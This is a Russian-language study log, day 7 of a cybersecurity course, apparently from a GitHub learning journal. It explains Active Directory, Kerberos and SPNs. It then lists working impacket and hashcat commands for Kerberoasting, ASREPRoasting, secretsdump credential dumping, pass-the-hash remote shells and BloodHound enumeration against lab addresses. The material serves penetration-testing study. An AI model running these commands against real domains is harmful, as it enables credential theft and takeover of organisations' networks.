# День 7 — Active Directory: Теория и Атаки
**Дата:** 07.04.2026  
**Результат теста:** 5/5 ✅  
**GitHub:** muhammadjumazoda06-design/cybersec-journey

---

## 🧠 Ключевые концепции AD

### Domain Controller (DC)
- Главный сервер сети — хранит всех пользователей, группы, политики (GPO)
- Захватил DC = захватил всю сеть
- Общается с клиентами через **Kerberos (порт 88)** и **LDAP (порт 389/636)**

### Kerberos — протокол аутентификации
```
Клиент → [AS-REQ] → KDC → [AS-REP: TGT] → Клиент
Клиент → [TGS-REQ: TGT] → KDC → [TGS-REP: TGS] → Клиент
Клиент → [AP-REQ: TGS] → Сервис → Доступ
```
| Термин | Расшифровка | Что это |
|--------|-------------|---------|
| KDC | Key Distribution Center | Часть DC, выдаёт билеты |
| TGT | Ticket Granting Ticket | Билет для получения других билетов (живёт 10ч) |
| TGS | Ticket Granting Service | Билет для конкретного сервиса |
| SPN | Service Principal Name | Уникальный ID сервиса — аккаунты с SPN уязвимы к Kerberoasting |

### LDAP
- Протокол для запросов к базе AD
- Используется BloodHound для сбора данных: группы, права, ACL, сессии

### SPN (Service Principal Name)
- Уникальный идентификатор сервиса (например: `MSSQLSvc/db.corp.local:1433`)
- **Любой доменный пользователь** может запросить TGS-хеш для SPN-аккаунта
- Это основа атаки Kerberoasting

---

## ⚔️ Атаки на Active Directory

### Attack Path (типичный)
```
Foothold → Enum AD → Kerberoast/ASREPRoast → Crack Hash → Lateral Movement → Domain Admin
```

### 1. Kerberoasting
**Суть:** запрашиваешь TGS для SPN-аккаунта → получаешь зашифрованный хеш ($krb5tgs$) → ломаешь оффлайн  
**Требует:** любой доменный аккаунт (не нужен root/admin!)

```bash
# Найти SPN-аккаунты и получить хеши
impacket-GetSPNs domain.local/username:password -dc-ip 10.10.10.100 -request

# Сохранить хеши в файл
impacket-GetSPNs domain.local/username:password -dc-ip 10.10.10.100 -request -outputfile kerberoast.txt

# Взломать через hashcat (-m 13100 = Kerberos TGS-REP)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### 2. ASREPRoasting
**Суть:** аккаунты без Kerberos pre-auth — можно получить хеш БЕЗ пароля

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 10.10.10.100 -no-pass
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 3. Secretsdump — дамп хешей
```bash
# По паролю
impacket-secretsdump domain/administrator:password@10.10.10.100

# По NTLM-хешу (Pass-the-Hash)
impacket-secretsdump domain/administrator@10.10.10.100 -hashes :NTLM_HASH
```

### 4. Pass-the-Hash (PtH)
**Суть:** NTLM-аутентификация не требует знания пароля — достаточно хеша

```bash
# psexec — удалённый SYSTEM shell
impacket-psexec domain/administrator@10.10.10.100 -hashes :NTLM_HASH_HERE

# wmiexec — тихий вариант (без создания сервиса)
impacket-wmiexec domain/administrator@10.10.10.100 -hashes :NTLM_HASH_HERE
```

### 5. BloodHound — граф атаки
```bash
# Установка
sudo apt install bloodhound neo4j -y

# Сбор данных (коллектор)
pip3 install bloodhound
bloodhound-python -u username -p password -d domain.local -ns 10.10.10.100 --zip

# Запуск
sudo neo4j start
bloodhound   # импортируй ZIP → ищи "Shortest Paths to Domain Admins"
```

---

## 🛠️ Установка Impacket

```bash
# Вариант 1 — через apt (быстро)
sudo apt update && sudo apt install python3-impacket -y

# Вариант 2 — из GitHub (актуальная версия)
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install . --break-system-packages

# Проверка
impacket-GetSPNs --help
```

### Ключевые скрипты Impacket
| Скрипт | Атака | Описание |
|--------|-------|----------|
| `GetSPNs.py` | Kerberoasting | Запрашивает TGS-хеши для SPN-аккаунтов |
| `GetNPUsers.py` | ASREPRoasting | Хеши без пароля (нет pre-auth) |
| `secretsdump.py` | Credential Dumping | Дамп SAM, NTDS.dit, LSA по сети |
| `psexec.py` | Lateral Movement | Удалённый SYSTEM shell |
| `wmiexec.py` | Lateral Movement | Тихий shell через WMI |
| `smbexec.py` | Lateral Movement | Shell через SMB (без записи на диск) |

---

## 📋 Чеклист Дня 7

- [x] Понимаю как работает Kerberos (TGT → TGS → доступ)
- [x] Знаю что такое SPN и почему он уязвим
- [x] Установил Impacket
- [ ] Выполнил Kerberoasting в лабе / TryHackMe
- [ ] Запустил BloodHound и нашёл Attack Path
- [ ] Прошёл TryHackMe: Attacktive Directory

---

## 🔗 Ресурсы

- [TryHackMe: Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [BloodHound Docs](https://bloodhound.readthedocs.io)
- [HackTricks — AD Attacks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)

---

## 💡 Что дальше — День 8

**Тема:** Python для ИБ + Разведка (Passive Recon)  
**Инструменты:** theHarvester, Subfinder, Shodan, Python requests  
**Задание:** Passive recon по учебному домену, DNS zone transfer скрипт

---
*Прогресс: 7/60 дней · Фаза 1: Основы*
